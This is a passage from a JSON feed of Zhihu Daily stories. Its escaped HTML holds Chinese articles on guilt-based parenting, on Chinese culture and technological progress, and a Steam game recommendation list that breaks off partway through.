src=\"https://pic3.zhimg.com/v2-954ae0f453cbf212f9d0f7067fdbcaf9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（截止 2021 年 6 月 11 日）有史以来 110 米栏最快成绩榜单，前 50 名中刘翔占 6 次、前 100 名中刘翔占据 8 次</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/50191573\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737588"},{"title":"父母的内疚式教育，对孩子影响有多大？","date":"2021-06-29 23:07:58","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-d16accbebde1de7a38136fbe065b06e0_l.jpg?source=8673f162\"><span>常爸-黄任，</span><span>传播科学育儿理念，提供优质教育资源。公号：常青藤爸爸</span>\n<a href=\"https://www.zhihu.com/question/466230596/answer/1966895816\" hidden>阅读原文</a>\n</div>\n<div>\n<p>先提醒一下大家：</p>\n<p>■ 用内疚来控制孩子的父母真的很多，甚至可以说<strong>绝大多数中国父母都在孩子身上实践过这一招，只是或轻或重，自己意识得到意识不到了。</strong></p>\n<p>■ 内疚是一种负性情绪，但让孩子内疚并不全然是坏事，反之<strong>适合的内疚</strong>是一个人道德水平最好的检验官，但是<strong>过度内疚就是妥妥的有害情绪</strong>。</p>\n<p>接下来，详细说一下什么是“内疚式教育”以及这种教育方式对孩子的影响。</p>\n<p><strong><strong>01</strong></strong><strong><strong>内疚，是道德的“晴雨表”</strong></strong></p>\n<p>先来看看什么是内疚？</p>\n<p>它是一个人真的做错了事情，或者想象中做错了事情，因为违背良心而对他人产生的一种惭愧、不安的心情，它是道德情绪中的一种。</p>\n<p>为了不受到道德惩罚，消除内疚感，人们往往会积极努力地做出弥补，比如道歉、关心别人，或者满足别人的愿望等。</p>\n<p>就像一个小孩子推倒了另一个小孩子，看到对方哇哇大哭，这个小孩就会觉得很内疚，进而安慰对方、把对方扶起来。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-aec48bd2c30320b7d3b01b12581f1289_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以，有适当内疚感，就证明这个人有道德要求，是一个心理健康的人，在这个层面上，内疚可以和“自省”划等号。反之，没有内疚感或内疚感比较低的人，则更可能做出不道德的事情。</p>\n<p>曾经有一个研究显示：</p>\n<blockquote>低内疚感的人更容易撒谎或做出不诚实的行为，比如不买门票就进入电影院、公园等。而高内疚感的人，则更少撒谎或做出不道德的事情，在商务谈判、做出决策时也会表现得更诚实。</blockquote>\n<p>试想，你身边有这样两个人：</p>\n<p>A、诚实友善，关注别人的感受</p>\n<p>B、撒谎投机，只考虑自己的感受</p>\n<p>你会选择和谁做朋友呢？</p>\n<p>毫无疑问，一定是 A 更受欢迎。</p>\n<p>因此，<strong>有高内疚感的人，也更容易交到朋友，融入集体，团队合作和协作能力也更强，人生幸福度也更高。</strong></p>\n<p>一般情况下，很多父母认为让一个孩子产生“内疚感”，是为了让他成为一个更好的人。</p>\n<p>比如说爸妈挣钱不容易，让孩子知道勤俭节约；</p>\n<p>说爸妈为了孩子上学付出很多，让孩子知道奋发向上；</p>\n<p>说爸妈工作的辛酸，让孩子知道感恩；</p>\n<p>说爸妈生活的艰辛，让孩子有同理心，体谅他人。</p>\n<p>事实上，这些并没有什么错，不管是勤俭、有上进心和责任心、感恩或体谅他人，都是美德，也是一个人顺利进入社会、融入团体的必要条件。</p>\n<p><strong>那为什么《不要小看我》节目中【扇耳光的妈妈】会激起这么多人的反感呢？</strong></p>\n<p>因为她犯了一个过犹不及的错误：<strong>认为孩子越内疚，就越有道德感、有上进心。</strong></p>\n<p><strong>但事实上，过度内疚弊大于利。</strong></p>\n<p><strong><strong>02</strong></strong><strong><strong>过度内疚，是操纵孩子的遥控器</strong></strong></p>\n<p>纪录片《你的孩子不是你的孩子》里，有一集叫《妈妈的遥控器》。片中那个妈妈得到了一个神奇的遥控器，可以控制孩子的一举一动。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4e9e24a42f8ccc839349dcf41ae6e9c5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>现实中，这样的遥控器并不存在。但事实上，<strong>父母早已人人手握一个隐形的遥控器</strong>：</p>\n<p>在孩子面前示弱，表示自己很受伤，让孩子产生内疚感，进而让孩子道歉、听自己的话，做一个乖孩子。</p>\n<p>这种做法，在心理学上被称为<strong>愧疚诱导</strong>（Guilt Inducement），指的是一方先表示出自己很受伤，诱发另一方产生愧疚感，促使其做出道歉、关心、弥补等行为，以达到自己的目的。</p>\n<p>研究显示，<strong>情侣、家人、亲子之间愧疚诱导最容易起效。</strong></p>\n<p>为什么？</p>\n<p><strong>因为家人、爱人、孩子，最渴望得到父母、爱人、亲人的接纳和爱。</strong></p>\n<p>“We allow emotional blackmail to happen to us because of our intense desire to be loved, accepted and appreciated by others.”</p>\n<p>我们之所以允许别人对自己进行情感勒索，是因为我们太渴望被爱、被接受、被赞赏了。</p>\n<p>这点对一个年幼的孩子来说尤甚，<strong>没有不爱父母的孩子，所以也就没有能逃过父母“愧疚诱导”的孩子。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5700384aa0ef21a486cd6ae737d2aed4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>事实上，很多父母早已深谙此道：当孩子不听话时会顺嘴说一句“你这样，妈妈真的很难过”，然后再挤出两滴眼泪，孩子一定会立刻表示要乖乖的。</p>\n<p>还有下面这些话，是不是都非常熟悉？</p>\n<blockquote>“天天做家务真累，但为了你能好好学习，妈多累都愿意。”<br>“要不是因为要陪你学习，我才不会当什么全职主妇。”<br>“你成绩这么差，我都抬不起头了。”</blockquote>\n<p>最夸张的是我在网上看到的一个故事：</p>\n<blockquote>一个孩子不想上培训班了，妈妈说了一句：“你不上就别上啊。”<br>孩子很高兴，以为妈妈同意了。没想到妈妈开始捂着肚子，喊胃疼。孩子就关心地询问。结果妈妈说：“要是你能好好学习，妈妈的肚子就不疼了。”<br>孩子立即表示，要继续上培训班，妈妈笑逐颜开。她的胃疼，也仿佛真的烟消云散了。</blockquote>\n<p><strong><strong>03</strong></strong><strong><strong>破碎的自我，无从修复</strong></strong></p>\n<p>为什么平日里那么高傲的父母，愿意这个时候示弱、展现伤口呢？</p>\n<p>《情感勒索》的作者，心理咨询医师苏珊·福沃德(SusanForward)这样解释：</p>\n<blockquote>只有赤裸裸地将痛处暴露在别人面前，情感勒索的手段才能奏效。</blockquote>\n<p><strong>让一个孩子看到父母的伤口，就是最好的“愧疚诱导”。</strong></p>\n<p>就像那个扇耳光的妈妈，孩子怎么也背不会，她没有想过，孩子是不是因为压力太大紧张才背不出来，或者时间太晚孩子太困了，亦或是孩子没明白作业内容？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cb9155f27de04da4aefe5dd900bbff8f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>她只是<strong>急于把自己情绪失控的责任转移给孩子</strong>，于是用打耳光的方式，让孩子清清楚楚地看到自己受伤了，<strong>让孩子产生内疚感，承担本不属于自己的责任</strong>。</p>\n<p>所以，实际上那个孩子承担了两份内疚感：</p>\n<p><strong>背不了作业的内疚和让妈妈受伤的内疚。</strong></p>\n<p>过度内疚之下，孩子一定会更努力，也更紧张，背书的效果反而不尽如人意，所以这个妈妈接连打了自己很多耳光。</p>\n<p>更多细节，我并不清楚。但在那个场景下的黄小桃承受了多少压力，却是一目了然的。那个夜晚过后，背诵作业的任务完成了，但是过度内疚对黄小桃的折磨却刚刚开始。</p>\n<p>研究显示，<strong>过度内疚会导致强烈的自我攻击，让人陷入抑郁或应激心理障碍，过度讨好他人、自卑、敏感，很容易紧张等。</strong></p>\n<p>香港作家马家辉，就提到过自己童年遭遇的一件小事：</p>\n<blockquote>年幼时，家里条件一般，父亲买回来一个芒果，家里七口人分着吃了。年龄最小的马家辉，分到了最小的一块儿。<br>芒果太好吃了，马家辉就偷偷攒着零用钱买了一个芒果。晚上，等家里人全部睡去后就自己一个人吃。<br>没想到，父亲半夜里起床发现了他偷吃的行为，他说这是自私的行为。</blockquote>\n<figure><img src=\"https://pic4.zhimg.com/v2-a2a9e9ad1f91722649d148d2bba31484_720w.jpg?source=8673f162\" alt=\"\"></figure><blockquote>更没想到的是，此后父亲有事没事就提起这件事，“<strong>有三千遍吧”</strong>。<br>从那以后，他就对吃这件事产生了一种深深的内疚感，以至于功成名就的他，依然是一名“食冷淡患者”。</blockquote>\n<p><strong>尽管他已经买得起任何一种美食，但却依旧觉得自己不配。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-4f956e634d975c36f1d8afa3f47f6a79_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个时候的“内疚”，等于“羞愧”，是一种让孩子全面否定自我的有毒压力。</p>\n<p>既要让孩子有内疚感，又不能让孩子有过度的内疚感，<strong>父母到底该怎么做？</strong></p>\n<p><strong><strong>04</strong></strong><strong><strong>就事论事，点到即可</strong></strong></p>\n<p>说到这个问题，我想到的第一个词语就是：</p>\n<p><strong>Constructive feedback，有建设性的反馈。</strong></p>\n<p>让孩子内疚的前提，是孩子意识到自己犯了错误；让孩子消除内疚的前提，是他们知道怎么做能弥补错误，减少对他人的伤害。</p>\n<p>这两点，最终的指向就是“有建设性的反馈”，一方面对孩子的表现做出正确回应，一方面给孩子提供有建设性的意见，让他们知道怎么做才是正确的。</p>\n<p>这样孩子才能主动反省，承担责任，也学会了怎么疏解不良情绪。</p>\n<p>所以，当父母发现孩子浪费粮食、不知道感恩、伤害别人时，不要着急批判孩子自私自利、白眼狼，而是在开口之前，先问自己一个问题：</p>\n<p>“<strong>我要怎么给他一个建设性的反馈呢？”</strong></p>\n<p>这么一个问题，就可以让自己的思路从批判转换到反思上。</p>\n<p>其实，想让孩子成为一个更好的人，还有一个更简单却也更不易的方法：</p>\n<p><strong>你自己先成为那个更好的人。</strong></p>\n<p>言传身教，永远是最好的教育方法。</p>\n<p>曾经在网上看到一个视频，一个成都的小男孩无意间看到了妈妈读硕士时的英语笔记。</p>\n<p>笔记内容详实，字面整洁。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-650a36aca1e1e2ec50ca94fb27d2bc66_720w.jpg?source=8673f162\" alt=\"\"></figure><p>男孩看着看着就哭了，不是妈妈批判他“不好好学习”，而是男孩自己内疚地哭了。</p>\n<p>因为那一刻，他才发现原来妈妈也要学习，而且妈妈学习那么认真、那么努力。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-05bbf75da8b30bb548a053d73f5f7336_720w.jpg?source=8673f162\" alt=\"\"></figure><p>男孩哽咽着说：“对不起，妈妈，我没有好好学习。”</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-045855f1c5ee654874d3cca7b90a7d1e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>没有跳楼，没有诉苦，也没有扇耳光，这个妈妈用自己的行动，让孩子看到好好学习是什么样子。</p>\n<p>其实，即便你不说，考不好、没完成作业的孩子，自己已经很内疚了。因为人天生就有变得更好的自驱力。这个时候，父母要做的，就是给孩子展示过来人的经验，给他们以引导就可以。</p>\n<p><strong>你的生气、崩溃，不是因为孩子的成绩和学业表现，更不是孩子的错，而是你情绪控制失败的产物。</strong>这个责任，应该是父母来背，不应该转嫁到孩子身上。</p>\n<p>最后，放上胡适写给儿子的信，请各位父母时常拿出来诵读以自省：</p>\n<blockquote>\n<strong>我并不是你的前传，你也并不是我的续篇。</strong><br><strong>你是独立的个体，是与我不同的灵魂；你并不因我而来，你是因对生命的渴望而来。</strong><br><strong>你是自由的，我是爱你的；但我不会“以爱之名”，去掌控你的人生。</strong>\n</blockquote>\n<p>只要想想，你让他感到内疚、选择听话的<strong>一切前提都是因为他爱你</strong>，就不忍心再给他加一点儿内疚了。</p>\n<p><strong>参考资料：</strong></p>\n<blockquote>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.oneheartcounselingcenter.com/healthy-guilt/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>oneheartcounselingcenter.com</span><span>/healthy-guilt/</span><span></span></a><br><a href=\"http://link.zhihu.com/?target=https%3A//familyfirstva.com/healthy-guilt-unhealthy-guilt-and-shame-how-to-tell-the-difference-and-how-to-let-go/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>familyfirstva.com/healt</span><span>hy-guilt-unhealthy-guilt-and-shame-how-to-tell-the-difference-and-how-to-let-go/</span><span></span></a><br><a href=\"http://link.zhihu.com/?target=https%3A//www.moms.com/how-emotional-blackmailing-children-hurts/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>moms.com/how-emotional-</span><span>blackmailing-children-hurts/</span><span></span></a><br><a href=\"http://link.zhihu.com/?target=https%3A//exploringyourmind.com/emotional-blackmail-and-how-it-harms-our-kids/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>exploringyourmind.com/e</span><span>motional-blackmail-and-how-it-harms-our-kids/</span><span></span></a><br><a href=\"http://link.zhihu.com/?target=https%3A//youaremom.com/children/emotional-blackmail-in-children/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>youaremom.com/children/</span><span>emotional-blackmail-in-children/</span><span></span></a>\n</blockquote>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/466230596\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737564"},{"title":"哪些中国文化对科技发展有促进作用？","date":"2021-06-29 23:07:54","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-1b2889cd21a77789194e961efc7f6f09_l.jpg?source=8673f162\"><span>ag獭，</span><span>好奇而无用的獭獭</span>\n<a href=\"https://www.zhihu.com/question/460009331/answer/1903400325\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>回答这个问题之前，先要明确一下，什么是科学技术？中国文化有哪些独到特色？</strong></p>\n<p>科学，是人类认识世界的一种实践方法。英语中的科学 Science，来源于拉丁文中的 Scientia，意思是“知识””学问“，而在中文里，科学又可以理解成“分科的学术研究”。归根结底，科学是我们认识世界的一种方式，但不是唯一的认识方式，随着社会的发展，在不同时代、不同领域，科学的范畴自然也有所不同。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-aa9a6b57aa84f3f5175702dbd1c59aaf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>汉代刘歆编著的《七略》，是中国最古老的藏书目录之一，现代意义上的科学书籍，在七略中，大约属于术数、方技、诸子等略，和今日之学科分类大不相同。（中国大百科全书，图书馆学情报学档案学卷）</figcaption></figure><p>现代意义上的科学，大约形成于文艺复兴后的西欧，此前，古希腊人发展出了公理体系，但没有形成现代科学，中国古人重视实践和记录，也没有形成现代科学。在现代科学形成的过程中，古希腊人和中国古人都贡献出了自己的一份力量，但古人自有其认识世界的方法，也自有其对学术体系、自然世界的分类方式。在不同社会背景之下，每一种分类和认识方式，只要适合，就是合理的。</p>\n<p>与之相似，所谓文化，自然也是不断变化的。清末的相片上，许多人看起来都麻木呆滞、死气沉沉，几十年后的新中国，人们的精神面貌却与之大不相同。不过几十年工夫，孕育中国国民的文化却发生了巨大改变。西汉的中国文化、南宋的中国文化以及 21 世纪的中国文化，显然是不同的。但总有一些藏在深处的文化基因，能够历经时间的筛选，世代流传。这大概也是中华文明能历经数千年而不断的原因所在。</p>\n<p>那么有哪些中国文化，能够历经千年，并对科技发展产生促进作用呢？</p>\n<p><strong>重视教育</strong></p>\n<p>中国是世界第一个以考试作为官僚选拔机制的国家。科举制度的诞生，为国家选拔了大批文化水准过关的可靠官员，促进了阶层流动，打破了世家大族对高层职位的垄断。日积月累，社会上形成了重视教育和学历的文化氛围。大多数中国人相信，只要用功读书，考入名牌学府，在高考这条独木桥上脱颖而出，便有可能提升自己的社会阶层，向着自己的人生目标迈进。</p>\n<p><a href=\"https://www.zhihu.com/question/359085476/answer/921968387\">OECD 2018 年 PISA 测试成绩出炉，中国在阅读、数学和科学方面拿下全球第一，如何看待该测试结果？</a></p>\n<p>无论是针对基础教育的 PISA 测试、针对高中尖子生的学科奥赛还是世界各大名校的学业表现，以中国为代表的东亚学子都在其中表现出色，用实际成绩说明了，东亚人不但爱学习，而且学得好。在欧美名校的理工科专业中，东亚裔学生的占比远远超出了其在世界人口的比重。假以时日，这些优秀的理工科学生，将很可能成为未来科技发展的领军人。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8bf285f61a4c701922eb83bb8b189fa7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>中世纪伊斯兰世界的学科分类，和今日的学科分类显然也有很大差别（中亚文明史，第四卷）</figcaption></figure><p>随着人类社会的发展，脑力资源在科技发展中，将会扮演日益重要的角色。未来的产业升级，科技自立，需要大量具备足够教育水平的高素质人才。作为后发地区，东亚社会能在技术发展上追上欧美的脚步，取得耀眼的经济发展成就，重视教育的文化，在其中功不可没。</p>\n<p><strong>实用主义</strong></p>\n<p>中国古人强调经世致用，学以致用，许多人认为，中国人注重实用主义的态度，阻碍了现代科学的产生，是导致中国近代落后于世界的一大原因。但在我看来，未必如此。</p>\n<p>科技科技，既有科学，也有技术。中国古代在纯粹理论科学方面，也许不如同时代的希腊化国家或者黄金时代的伊斯兰社会，但在技术方面，古代中国并不落后，甚至在很长一段时间中都领先世界。实用主义的态度，也许阻碍了中国古人对超越现实的终极真理的追求，但大多数理论研究，最终还是要将其转化为实际应用。只要有合适的理论和应用场景，中国人总有各种办法将其转化为实际应用，这些应用又将推动社会的发展，为理论提供更坚实的基础。</p>\n<p>古希腊哲人的思索，并没有让希腊成为屹立千年的强国，反而是注重实际的罗马，将地中海变为自己的内湖。近代欧洲的科技发展，也是建立在现实世界的需求和应用基础之上的。纯粹的实用主义，也许不利于科学的发展，但纯粹的理论玄想，也终有其思索的局限。理论与实际相辅相成，互相促进，要营造合理、健康的发展道路，就需要在理论和实用之间保持平衡，不可偏废。</p>\n<p><strong>勤于记录</strong></p>\n<p>中国古人注重历史，勤于记录，留下了大量科学观测的历史资料。以天文学为例，中国是古代世界天文记录最完备，最详尽的国家——</p>\n<blockquote>《尚书·胤征》中记载了夏王仲康时代的日食，据推算，这次日食可能发生在公元前 2137 年 10 月 22 日，果真如此的话，这大概是世界上最早的日食记录。<br>《左传·隐公三年》记载了公元前 720 年 2 月 22 日的一次日食，这是世界关于日食的最早的书面记录，也是中国使用干支记年的明证。在这之前，商代卜辞中也记载了日月食，但没有具体日期。<br>《左传·庄公七年》中留下了世界上关于<strong>流星雨</strong>的最早记载“夏四月辛卯夜，恒星不见，夜中星陨如雨”。《竹书记年》中可能记载了更早的夏代时期的流星雨，但不能确定。<br>《春秋》鲁文公十四年（公元前 613 年）“秋七月，有星孛入于北斗。”这是世界上最早的关于哈雷<strong>彗星</strong>的记载。之后在《史记》等典籍中，多次记录了这颗彗星，截至宣统二年，中国古史记载了 31 次哈雷彗星的回归。（哈雷彗星的绕行周期约 76 年，说明大部分回归都被记录到了）<br>公元前 4 世纪的魏国天文学家石申著有《天文》八卷，齐国天文学家甘德著有《天文星占》八卷，后人将这两位天文学家的著作合称为<strong>《甘石星经》</strong>，这是仅次于巴比伦<strong>星表</strong>的世界现存第二早的天文著作。《甘石星经》记载了五星运动，记录了 800 多个恒星的名字和星宫，并标注了 121 颗恒星的位置，要比地中海世界最早的喜帕恰斯星表早一百多年。甘德首先记载了太阳黑子，可能还用肉眼发现了木卫三，如果得到确认，那就要比伽利略发现木星卫星早上两千多年。</blockquote>\n<p>详细内容，可以看这篇回答——</p>\n<p><a href=\"https://www.zhihu.com/question/38520383/answer/1858612382\">中国古代的天文学达到了什么高度？</a></p>\n<p>星体的移动、气候的改变、山川的变动，都是日积月累、缓慢进行的。许多科学研究都需要经年累月的观测记录，而中国古人的记录，就为这些研究留下了丰富的宝藏。</p>\n<p>另一方面，古人的记录与思索也是现代科研人员的思想宝库，例如青蒿素的发现，就和晋代葛洪记载的偏方有关。</p>\n<p><strong>语言与符号</strong></p>\n<p>汉语是一种孤立语（或称分析语），所谓孤立语，是指通过独立的虚词和固定的词序，而不是通过词形变化来表达语法意义。汉语中的新词大多都是用旧字组合构成的，许多词都能顾名思义，不必查字典，就能大略了解一个新词的意义，这大大降低了人们构造和掌握新概念的能力。举例来说，英语中的公牛（bull）、母牛（cow）、水牛（Buffalo）都是不一样的单词，而在汉语中，只要看到这几个词，就能够明白其中的区分。</p>\n<p>为了记录汉语，中国古人发展出了独特的汉字，这是现存唯一广泛使用的表意文字。虽然汉字符号众多，入门难度高，但只要熟练掌握汉字，就能用它创造出各种新概念。相比读音，一个字或词的含义在历史中很少发生变化，正是由于汉字的存在，每个受过教育的中国人都能阅读数千年前的古籍，从中汲取古人的智慧。也正是由于汉字，中华文化得以传承千年而保存其基本形态，不因语言拼写的差异而分化为不同的族群。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-90eecc892c26805a799502285310ceaf_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在未来的科学研究和科技发展中，还将出现许多新概念和新单词，届时，掌握汉语将大大降低学习掌握新概念的时间，同时也利于传播这些含义不同的新概念。</p>\n<p><strong>集中力量办大事</strong></p>\n<p>美籍德裔学者魏特夫曾在对中国社会的研究中，提出“治水社会”这一概念。认为像中国这样“东方专制社会”的发展，离不开灌溉农业的发展和大型治水工程的兴办。这就需要协调、纪律和领导，由此产生“治水社会”的官僚主义政治形态。魏特夫的理论，早年在我国引发了不少批判，不过类似治水这样集中力量办大事的传统，在中国却是由来已久的。</p>\n<p>随着现代科学的发展以及学术体系的复杂化，过去那样单打独斗的思想探索已经越来越难以满足当下的科研要求。原子弹和火星探测器都需要大量人员、机构和资源的通力配合才能完成。如今，无论是科学研究还是科学大工程，都需要仰仗大量科研人员和相关人员组成的庞大团队，而在领导、建立、协调团队方面，我国是有基础的。</p>\n<p><strong>整体论</strong></p>\n<p>科学，是分门别类的学问，注重分析研究和客观性。而中国的传统文化，则强调整体性和统一性，注重人类与自然、社会的协调统一。西方传统的科研路径，固然取得了令人瞩目的学术成果，但发展到如今，过于狭隘的学科分类反而可能成为阻碍科技发展的绊脚石。而在此时，传统中国文化的整体观念，或可为其找到一条新的出路。特别是在理论转化为实际应用的过程中，则更需要考虑科学理论与社会整体之间的联系。</p>\n<p>当然在西方，也有类似的反思和发展。比如上世纪兴起的系统科学、运筹学和控制论，就颇有重视系统与整体，统筹综合的思想。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/460009331\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737574"},{"title":"Steam 上有哪些必买游戏？","date":"2021-06-29 23:07:46","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-f268e3119e7ac00f9279f9af29992fb5_l.jpg?source=8673f162\"><span>汪靖豪，</span><span>专心做一个点赞的知乎用户。</span>\n<a href=\"https://www.zhihu.com/question/35296900/answer/1029313440\" hidden>阅读原文</a>\n</div>\n<div>\n<p>摸着良心说话，以下每款游戏玩个几十小时上百小时都不过分，对于一些特殊类型的游戏上千小时也是很正常的。</p>\n<p>我想最早关注这个问题应该很多都是喜欢打游戏，比如玩玩动视暴雪、腾讯、网易这三家的游戏，但是对 steam 接触不深的玩家，或者说以前玩了些盗版，毕竟现在 steam 上有几万款游戏，从茫茫多的游戏中找到自己所爱还是要花费些许时间的，</p>\n<p>没错我就是那个 steam 萌新，在一群骨灰级单机玩家朋友的安利下带着慢慢成为新司机。</p>\n<p>既然是<strong>必买</strong>，就推荐几个贴吧&amp;黑盒&amp;NGA&amp;知乎呼声都比较高的游戏，萝卜青菜各有所爱，喜欢玩的人多的游戏你不一定喜欢，但不代表是游戏不好，可能某一天你再去回味回味就会有另一番风味。</p>\n<p><strong>其实大家买东西看哪家公司出的，玩游戏也看是哪个公司开发，哪个公司发行，下面以各大公司为主题安利。比较厉害的公司主要有</strong></p>\n<p><strong>V 社(steam 创立)、ubi(旅游模拟公司)、CDPR(不赚钱的公司)、R 星(永远在新建文件夹)、</strong></p>\n<p><strong>B 社(捡垃圾废土开放世界)、P 社(如何看待 P 社玩家群体)、Capcom(动作天尊冷饭王)、</strong></p>\n<p><strong>SE(游戏是好游戏但公司要不得)、SEGA(街机年代老公司)、KOEI(活在情怀里的公司)、</strong></p>\n<p><strong>EA(美国腾讯)、万代南梦宫(你喜欢的动漫他都能给你做成游戏)、WB(IP 游戏)</strong></p>\n<p><strong>2020 年 3 月 14 日 update 精品篇</strong></p>\n<p><strong>2020 年 4 月 4 日 update 主播学习篇</strong></p>\n<p><strong>为什么想更这个呢，一来是方便大家玩的时候卡关了可以找视频看看，二来是一些游戏真的很难可以看视频攻略来学习，三来我自己也是看视频学习来的，吃水不忘挖井人既然有这么多 hxd 在看就当流量入口推荐给大家，第四就是大家如果没有打主意买可以云一会，再决定买不买</strong></p>\n<p>游戏都买了，为什么还要我花时间玩。什么，还要我废脑袋去学习，你肯定是疯了。</p>\n<p><strong>2020 年 5 月 9 日 update 更新几个我已经玩到的几个新的大作，再安利几个预购项目</strong></p>\n<p>2020 新上线 steam 的大作(<strong>无主之地 3</strong><strong>骑砍 2 Doom</strong><strong>生化危机 3RE</strong> 死亡搁浅 2077 英灵殿 光环无限 Forest2 消光 2 看门狗军团 渡神纪) 其中确认跳票目前<strong>未知时间</strong>的有 Forest2 消光 2 英灵殿 看门狗军团 渡神纪</p>\n<p><strong>2020 年 6 月 19 日 update stEAm 没有 EA 是什么呢？</strong></p>\n<p><strong>P 系列、盗贼之海、底特律变人等主机大作登录 steam。以及</strong></p>\n<p><strong><em>2077 第二次跳票</em></strong></p>\n<p><strong><em>2020 年 11 月 22 日 update 整理排版</em></strong></p>\n<p><strong><em>2077 第三次跳票</em></strong></p>\n<hr>\n<p><strong>大作篇（首发价在 200 元级别）</strong></p>\n<ol><li><strong>CDPR 巫师 3 年度版 47 元</strong></li></ol>\n<p><strong>可以先买不玩，等同类型的游戏玩多了你再回头品一品，你会发现 30 万 + 的好评如潮不是虚名。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e9519a25b9c8402dd49bbb3edc590328_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我自己 15 年最开始是看舍友玩了 100 小时巫师 3，自己也上手玩了十几个小时，当时自己沉迷守望先锋和英雄联盟，手游玩玩炉石，觉得这种画面有点昏暗，打击感不是很爽的游戏并不适合我。</p>\n<p>但是后来因为种种原因，我又一次玩上了巫师 3，这次我玩了 200 小时。你问我为什么？</p>\n<p>我只能回答，<strong>CDPR 是游戏公司中最会讲故事的人，是讲故事的人中最会做游戏的公司。</strong>如果你喜欢看《权力的游戏》这种异界低魔大陆类型的剧，那么巫师 3 就是会写爱情线的权游。</p>\n<p>玩多了你会发现其他 RPG 有的，巫师 3 基本上都有，如果你注意细节，而且相当多做剧情的游戏有借鉴巫师 3 故事的痕迹。比如奥德赛和巫师 3 的即兴戏剧环节。。</p>\n<p><strong>适合人群：有耐心，喜欢看书，愿意慢慢去探索了解新鲜世界的玩家。</strong></p>\n<p><strong>终极建议（一定要看）：</strong>如果你一开始玩就玩进去了，那么恭喜你，你已经享受到了这类的顶级作品；但是未来你玩其他作品可能会反复比较会失望。如果你并不喜欢，那么你可以和我一样先挑自己感兴趣的玩，觉得自己感兴趣的都玩的差不多了，再回头看看巫师 3，当时你不喜欢的地方是不是并不影响你玩。</p>\n<p>如果你还是接受不了巫师 3 的某些缺点，你可以和我一样打上 40 多个 mod，2015 年的画质可以勉强追上 2020 年的游戏画质。</p>\n<p><strong>如果你还是觉得 2015 年的画质差，可以在 2020 年提前体验 2077 年的生活。</strong></p>\n<p><strong>赛博朋克 2077 298 元</strong></p>\n<p>这次千万别再跳票了，建议大家 PC、主机都可以入。</p>\n<p>好了，6 月 19 号更新，接来噩耗，2077 第二次跳票。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9eec6a8c16f7f2a668475a1306f6e18b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>推荐主播：</strong><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/271442527%3Ffrom%3Dsearch%26seid%3D8356491775343664403\" target=\"_blank\" rel=\"nofollow noreferrer\">CD_PROJEKT_RED</a> 官方号</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV14x41197NT%3Ffrom%3Dsearch%26seid%3D8356491775343664403\" target=\"_blank\" rel=\"nofollow noreferrer\">《巫师 3 狂猎》美剧式流程攻略解说【老戴】</a> 老戴良心解说</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Ls411S7gv%3Ffrom%3Dsearch%26seid%3D8356491775343664403\" target=\"_blank\" rel=\"nofollow noreferrer\">【巫师 / 猎魔人 / 狩魔猎人 3】黑桐谷歌视频攻略</a> 谷歌大佬</p>\n<p>谷歌&amp;老戴警告，下面会频繁出现此二人</p>\n<p><strong>2. R 星 GTA V 59 元</strong></p>\n<p>都 2020 年了，谁还在买 GTAV。我们库存有当然可以随便口嗨。如果觉得想督促 R 星赶紧出 6 的，可以跳到下面大表哥 2。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-16ca1fc068cafa05dad008b7a99d3093_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最早是玩圣安地列斯系列，当时就已经是神作中的神作了，当然后来出了 V 更香，所以才有这么多人等 GTAVI。</p>\n<p>适合人群：喜欢真实的都市世界，高自由度，想要随心所欲干自己喜欢干的事的玩家</p>\n<p><strong>大表哥 2 249 元</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0aa05d3c8edc8e13a07c0db884f6afee_720w.jpg?source=8673f162\" 